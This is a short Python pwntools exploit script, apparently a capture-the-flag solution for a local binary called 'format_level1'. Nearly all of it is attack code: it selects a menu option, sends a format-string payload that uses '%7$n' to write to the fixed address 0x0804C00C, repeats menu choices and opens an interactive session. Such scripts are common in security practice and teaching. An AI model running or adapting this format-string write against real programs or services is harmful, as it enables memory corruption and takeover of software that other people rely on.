#! /usr/bin/python3
from pwn import *
# pyright: reportUndefinedVariable=false

context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

#libc = ELF('/home/sev1n/tools/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc.so.6')
#libc = ELF('./')
#elf = ELF('./')

#context.log_level = 'debug'
debug = 1

if debug:
    io = process('./format_level1')
else:
    io = remote('')

def p():
    gdb.attach(proc.pidof(io)[0])

#one_gadget = [,,]
io.sendlineafter(b"Your choice: ", str(3).encode())

#p()
payload = p32(0x0804C00C) + b"%7$n"
io.sendafter(b"Input what you want to talk: ", payload)

for i in range(5):
    io.sendlineafter(b"Your choice: ", str(2).encode())

io.sendlineafter(b"Your choice: ", str(1).encode())


io.interactive()

